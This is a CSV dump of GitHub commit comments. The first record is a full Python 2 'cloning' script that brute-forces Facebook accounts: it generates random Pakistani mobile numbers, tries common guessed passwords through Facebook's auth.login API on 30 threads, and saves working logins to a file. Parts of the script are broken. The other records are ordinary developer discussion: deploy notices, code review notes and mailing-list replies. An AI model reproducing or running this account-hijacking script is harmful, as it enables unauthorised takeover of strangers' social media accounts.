actor_id,type,body
68531283,CommitCommentEvent,"# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print(""\r\x1b[1;93mPlease Wait \x1b[1;91m""+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = ""\033[31mNot Vuln""
vuln = ""\033[32mVuln""

os.system(""clear"")
print  """"""


\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;91m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;91m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝


\033[1;97m
_________________________.s$$_____________s$
________________________s$$$’____________s$$
______________________.s$$$³´_______,___s$$³
_____________________s$$$$³______.s$’___$$³
________________,____$$$$$.______s$³____³$
________________$___$$$$$$s_____s$³_____³,
_______________s$___‘³$$$$$$s___$$$
_______________$$____³$$$$$$s.__³$$s
_______________³$.____³$$$$$$$s_.s$$$____s´
_______________`$$.____³$$$$$$$_$$$$___s³
________________³$$s____³$$$$$$s$$$³__s$’
_________________³$$s____$$$$$s$$$$’__s$$
_____________`s.__$$$$___s$$$$$$$$³_.s$$³__s
______________$$_s$$$$..s$$$$$$$$$$$$$$³__s$
______________s$.s$$$$s$$$$$$$$$$$$$$$$_s$$
_____________s$$$$$$$$$$$$$$$$$$$$$$$$$$$³
____________s$$$ssss$$$$$$$$$$$$$ssss$$$$$´
___________$$s§§§§§§§§§s$$$$$$s§§§§§§§§s$,
___________³§§§§§§§§§§§§§s$s§§§§§§§§§§§§s
___________§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§
___________³§§§§§§§§§§§§§§§§§§§§§§§§§§§§§
____________³§§§§§§§§§§§§§§§§§§§§§§§§§§§³
_____________³§§§§§§§§§§§§§§§§§§§§§§§§§³
______________³§§§§§§§§§§§§§§§§§§§§§§§³
________________³§§§§§§§§§§§§§§§§§§§³
__________________³§§§§§§§§§§§§§§§³
____________________³§§§§§§§§§§§³
_______________________³§§§§§³
_________________________³§³



\033[1;96m---------------------SOMI---------------------
action()
                
  033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯
             
                
\033[1;96m--------------------SOMI----------------------
""""""

####Logo####

logo1 = """"""
action()
    

\033[1;93m██████╗░██████╗░░█████╗░██████╗░
\033[1;93m██╔══██╗██╔══██╗██╔══██╗██╔══██╗
\033[1;96m██████╦╝██████╔╝███████║██║░░██║
\033[1;93m██╔══██╗██╔══██╗██╔══██║██║░░██║
\033[1;96m██████╦╝██║░░██║██║░░██║██████╔╝
\033[1;91m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░

\033[1;96m------------------SIDRA----------------------
action()
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯


\033[1;96m-----------------SOMi------------------------
""""""
logo2 = """"""
action()
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;91m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;91m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
   \033[1;96m  ╭━━━━━━━╮             ╭━━━━━━━╮																		
   \033[1;96m  ┃ ●  ══            ┃             ┃             ● ══ ┃ 																		
   \033[1;96m  ┃███████┃             ┃███████┃																		
   \033[1;96m  ┃███████┃             ┃███████┃																		
   \033[1;96m  ┃███████┃             ┃███████┃																		
 \033[1;96m    ┃███████┃\033[1;91m>>PakStar >>\033[1;96m┃███████┃																		
\033[1;96m     ┃███████┃             ┃███████┃																		   \033[1;96m     ┃███████┃             ┃███████┃																		
 \033[1;96m    ┃███████┃             ┃███████┃																	
 \033[1;96m    ┃███████┃             ┃███████┃																		
  \033[1;96m   ┃   ○                   ┃             ┃           ○            ┃																		
   \033[1;96m  ╰━━━━━━━╯             ╰━━━━━━━╯
 
\033[1;92mWHATAPP 03455453538
                
                


\033[1;96m---------------------SOMI--------------------
action()
    
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯

\033[1;95mSpeed Commands Country codeðŸ”¹
\033[1;91mWhataap number
\033[1;92_03455453538
                                                
\033[1;96m---------------------SOMI--------------------
""""

CorrectUsername = ""Somi""
CorrectPassword = ""Awan""

loop = 'true'
while (loop == 'true'):
    username = raw_input(""\033[1;97mðŸ“‹ \x1b[1;91mTool Username \x1b[1;97mÂ»Â» \x1b[1;97m"")
    if (username == CorrectUsername):
    	password = raw_input(""\033[1;97mðŸ— \x1b[1;91mTool Password  \x1b[1;97mÂ»Â» \x1b[1;97m"")
        if (password == CorrectPassword):
            print ""Logged in successfully as "" + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print ""\033[1;94mWrong Password""
            os.system('xdg-open https://m.facebook.comSOMIMISICAN.com')
    else:
        print ""\033[1;94mWrong Username""
        os.system('xdg-open https://m.facebook.comSOMIMUSICAN.com')


##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo
    print ""\033[1;95m[1]\x1b[1;92mSTART CLONING PRESS 1( \033[1;95m NEW UPDATE )""
    time.sleep(0.05)
    print '\x1b[1;94m[3]\033[1;91m Exit ( press 2)'
    pilih_login()

def pilih_login():
    peak = raw_input(""\n\033[1;95mCHOOSE: \033[1;93m"")
    if peak =="""":
        print ""\x1b[1;97mFill In Correctly""
        pilih_login()
    elif peak ==""1"":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[1]  START CLONING With SOMI'
    time.sleep(0.10)
    print '\x1b[1;94m[2] SOMI FB ACCOUNT'
    time.sleep(0.10)
    print '\x1b[1;95m[3] MORE INFO'
    time.sleep(0.10)
    print '\x1b[1;96m[4] TRACKER'
    time.sleep(0.10)
    print '\x1b[1;97m[5] CLONING ERROR'
    time.sleep(0.10)
    print '\x1b[1;94m[0] back'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97mCHOOSE:\033[1;91m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak ==""1"":              
        os.system(""clear"")
        print logo2
        print ""Enter any Pakistan Mobile code Number""+'\n'
        print 'Enter any code 1 to 49'
        try:
            c = raw_input(""\033[1;97mCHOOSE : "")
            k=""03""
            idlist = ('.txt')
            for line in open(idlist,""r"").readlines():
                id.append(line.strip())
        except IOError:
            print (""[!] File Not Found"")
            raw_input(""\n[ Back ]"")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan('\033[1;96m▬10%')
    jalan(""\033[1;96m▬▬20%"")
    jalan('\033[1;96m▬▬▬30%')
    jalan('\033[1;96m▬▬▬▬40%')
    jalan(""\033[1;96m▬▬▬▬▬50%"")
    jalan(""\033[1;96m▬▬▬▬▬▬60%    \033[1;91mPAKISTAN Country ID Clone"")
    jalan('\033[1;96m▬▬▬▬▬▬▬70%')
    jalan('\033[1;96m▬▬▬▬▬▬▬▬80%')
    jalan('\033[1;96m▬▬▬▬▬▬▬▬▬90%')
    jalan('\033[1;96m▬▬▬▬▬▬▬▬▬100%')
    jalan ('\033[1;96m Total ids number: '+xxx)
    jalan ('\033[1;95mCode you choose: '+c)
    jalan (""\033[1;94mWait A While Start Cracking..."")
    jalan (""\033[1;93mTo Stop Process Press Ctrl+z"")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(done)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(7Days) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Done)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3=""Pakistan123""
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Done)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4=""Pakistan""
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(done)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5=""786786""
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Done)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan(""Note : Your Offline account Will Open after 10 to 20 days"")
    print ''
    print """"""
    ███
──────────███║║║║║║║███
─────────█║║║║║║║║║║║║║█
────────█║║║║███████║║║║█
───────█║║║║██─────██║║║║█
──────█║║║║██───────██║║║║█
─────█║║║║██─────────██║║║║█
─────█║║║██───────────██║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
────███████───────────███████
───██║║║║║║██────────██║║║║║██
──██║║║║║║║║██──────██║║║║║║║██
─██║║║║║║║║║║██───██║║║║║║║║║║██
██║║║║║║║║║║║║█████║║║║║║║║║║║║██
█║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█
█║║║║║║║║║║║║║█████║║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
██║║║║║║║║║║║█░░░░░█║║║║║║║║║║║██
██║║║║║║║║║║║║█░░░█║║║║║║║║║║║║██
─██║║║║║║║║║║║█░░░█║║║║║║║║║║║██
──██║║║║║║║║║║█░░░█║║║║║║║║║║██
───██║║║║║║║║║█░░░█║║║║║║║║║██
────██║║║║║║║║█████║║║║║║║║██
─────██║║║║║║║║███║║║║║║║║██
──────██║║║║║║║║║║║║║║║║║██
───────██║║║║║║║║║║║║║║║██
────────██║║║║║║║║║║║║║██
─────────██║║║║║║║║║║║██
──────────██║║║║║║║║║██
───────────██║║║║║║║██
────────────██║║║║║██
─────────────██║║║██
──────────────██║██
───────────────███
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀



\033[1;96mThanks me later
\033[1;95mFb\033[1;97mSOmi
\033[1;95myoutube\033[1;97mhttps://w ww.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g""""""

    
    raw_input(""\n\033[1;92m[\033[1;92mBack\033[1;95m]"")
    login() 
          
if __name__ == '__main__':
    login()

"
68531283,CommitCommentEvent,**_****_**
30273922,CommitCommentEvent,"Verdaccio builds:
      [CRA Test App](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/build/index.html)
      [NextJS Test App](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/next/index.html)
      [CRA Test App Size](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/build-stats.txt)
      [NextJS App Size](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/next-build-stats.txt)
      [Publish stats](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/publish.json)
      [Size diff since last release](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/size-diff.txt)
      [Docs](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/docs/index.html)"
4502793,CommitCommentEvent,"No problem :)

--
Brian Chan
Chief Software Architect
Liferay, Inc.
Enterprise. Open Source. For Life.
(626) 806-1190

On Tue, Oct 20, 2015 at 1:39 PM, Jim Hinkey <notifications@github.com>
wrote:

> @brianchandotcom <https://github.com/brianchandotcom> - I forgot to push
> my Regen commit to origin with Cody's commits. Sorry about that. And thanks
> for doing the regen. - Jim
>
> —
> Reply to this email directly or view it on GitHub
> <https://github.com/liferay/liferay-portal/commit/74d18bc3aa6aaa2f9ed67dbc37043f80d44f5b89#commitcomment-13885771>
> .
>
"
8129835,CommitCommentEvent,this is great - very happy to get rid of that 'npm install -g npm' line for every version of node.  thanks!
4193587,CommitCommentEvent,"On 02/07/2015 21:55, jungle-boogie wrote:
>
> great to see openntpd included!
>
> —
> Reply to this email directly or view it on GitHub
> <https://github.com/pcbsd/pcbsd/commit/4f27f94f9b06da9e04c026bff1d004036308718f#commitcomment-9639243>.
>

Yep, just added the config and options to have it enabled by default.
Should go out in next EDGE package set.

-- 
Kris Moore
PC-BSD Software
iXsystems

"
35613825,CommitCommentEvent,"Successfully deployed to the following URLs:

## sandex – ./

[sandex.vercel.app](https://sandex.vercel.app)  
[sandex-tikaro.vercel.app](https://sandex-tikaro.vercel.app)  
[sandex.me](https://sandex.me)  
[www.sandex.me](https://www.sandex.me)  
[sandex-git-main-tikaro.vercel.app](https://sandex-git-main-tikaro.vercel.app)"
35613825,CommitCommentEvent,"Successfully deployed to the following URLs:

## node-minify – ./

[node-minify-git-develop-rod.vercel.app](https://node-minify-git-develop-rod.vercel.app)  
[node-minify.vercel.app](https://node-minify.vercel.app)  
[node-minify-rod.vercel.app](https://node-minify-rod.vercel.app)"
49554844,CommitCommentEvent,"答案是，你不需要。JSON中的`{}`花括号代表对象，对象中的属性（在语义上）是无序的，也就是说，它的顺序是不可依靠的。JSON中有两种东西：

- `{""a"":1,""b"":2}` 这是对象，其属性是无序的
- [""a"",""b""] 这是列表，其元素是有序的"
49554844,CommitCommentEvent,如果用StringBuilder的话，它自带reverse方法的。
49554844,CommitCommentEvent,`Character::isUpperCase`
49554844,CommitCommentEvent,这里也是，纯串行执行，虽然在多个线程中，但是完全没有发挥多线程的效率
49554844,CommitCommentEvent,可以把wordCount(file)挪到synchronized外面去，实现“并行读取，串行merge”。
49554844,CommitCommentEvent,👍 
43336896,CommitCommentEvent,"<!-- COMMIT COMMENT NOTIFICATION -->
### Review

- [openjdk/jdk/24](https://git.openjdk.java.net/jdk/pull/24)

### Issues

- [JDK-8252679](https://bugs.openjdk.java.net/browse/JDK-8252679)"
24802730,CommitCommentEvent,"Because json properties can be null, json schema classes require many nullable annotations.
And, these annotations do not help reduce NRE.
So I decide to disable annotations."
24802730,CommitCommentEvent,"In many cases, --including MicroBatchFramework.Tests--, `Context` is used without checking if it is `null`.
So annotate that `Context` is non-null."
18269663,CommitCommentEvent,Created PR to the official-images repo (https://github.com/docker-library/official-images/pull/6844)
18269663,CommitCommentEvent,Created PR to the official-images repo (https://github.com/docker-library/official-images/pull/7156). See https://github.com/docker-library/faq#an-images-source-changed-in-git-now-what if you are wondering when it will be available on the Docker Hub.
18567580,CommitCommentEvent,"
Hi! This is the friendly automated conda-forge-webservice.

I updated the Github team because of this commit.

- @zklaus was added to this feedstock maintenance team.

You should get push access to this feedstock and CI services.

Feel free to join the community [chat room](https://gitter.im/conda-forge/conda-forge.github.io).

NOTE: Please make sure to not push to the repository directly.
      Use branches in your fork for any changes and send a PR.
      More details [here](https://conda-forge.org/docs/maintainer/updating_pkgs.html#forking-and-pull-requests)
"
502938,CommitCommentEvent,"

On Thu, 3 Aug 2017, Markus Elfring wrote:

>
> I would find it better to omit this information also as a TeX comment.

And why would that be?

Maybe we will set up the wiki again some day, and then the comment can be
removed. Otherwise the connection wille forgotten.

> Would you like to end the transformed sentence with a dot?

No.  Not putting a dot after a file name makes things easier for someone
who wants to copy and paste it.

julia

>
> —
> You are receiving this because you authored the thread.
> Reply to this email directly, view it on GitHub, or mute the
> thread.[AAesml6noZayEA3PTrO22xnauaKgu2cXks5sUfOwgaJpZM4OsrYL.gif]
>
>
>"
502938,CommitCommentEvent,"

On Fri, 28 May 2021, Jacob Keller wrote:

>
> Hi,
>
> This appears to break when using a prefix such as $HOME, and causes spatch
> to search for standard.iso in the wrong directory:
>
> warning: Can't find macro file: /home/jekeller/bin/lib/coccinelle/standard.h
> warning: Can't find default iso file:
> /home/jekeller/bin/lib/coccinelle/standard.is

Thanks for the report.  We will look into it.

julia

>
> —
> You are receiving this because you are subscribed to this thread.
> Reply to this email directly, view it on GitHub, orunsubscribe.[AAD2ZGS3BPAKIE364QVWONDTQAORJA5CNFSM45SQFCSKYY3PNVWWK3TUL52HS4
> DFVVBW63LNNF2EG33NNVSW45FKMNXW23LFNZ2F62LEZYBRCJFH.gif]
>
>
>"
502938,CommitCommentEvent,"

On Thu, 7 Jan 2021, Markus Elfring wrote:

>
> Would the following code variant be useful for a while?
>
>     let check prefix suffix =
>        match (Unix.system (prefix ^ filename ^ suffix)) with
>          Unix.WEXITED rc -> (match rc with
>                              0 -> ()
>                              | _ -> failwith (Printf.sprintf ""call failure %d: %sfor %s"" rc prefix filename)
>                             )
>        | Unix.WSIGNALED s -> failwith (Printf.sprintf ""%swas killed: %s"" prefix filename)
>        | Unix.WSTOPPED s -> failwith (Printf.sprintf ""%swas halted: %s"" prefix filename) in
>     check ""dot "" ("" -Tps -o "" ^ filename ^ "".ps"");
>     check ""gv "" "".ps &"";

It looks ok, where does it go?

julia



>
> —
> You are receiving this because you authored the thread.
> Reply to this email directly, view it on GitHub, or unsubscribe.[AAD2ZGSLVHOMV5BU7QK7J5TSYWO53A5CNFSM4VXKFMZ2YY3PNVWWK3TUL52HS4DFVVBW63LNNF2EG33NNVSW45FKMNXW23LFNZ2F62LEZYBLTQPY.gif]
>
>
>"
502938,CommitCommentEvent,"You can write for example

`( F1 | F2 )`

where F1 and F2 are field-type metavariables, and they will be matched if possible."
502938,CommitCommentEvent,What is wrong with the commit?
502938,CommitCommentEvent,It's a test case.  What does it matter.
502938,CommitCommentEvent,"

On Thu, 16 Nov 2017, Markus Elfring wrote:

>
> Does the mentioned allowance depend only on the generation of an unique
> prefix?

I have absolutely no idea what the above means.

julia

>
> —
> You are receiving this because you authored the thread.
> Reply to this email directly, view it on GitHub, or mute the
> thread.[AAesmkbBGFqARfY2MLnLo2zGMa90wfRQks5s2_P3gaJpZM4QgIOY.gif]
>
>
>"
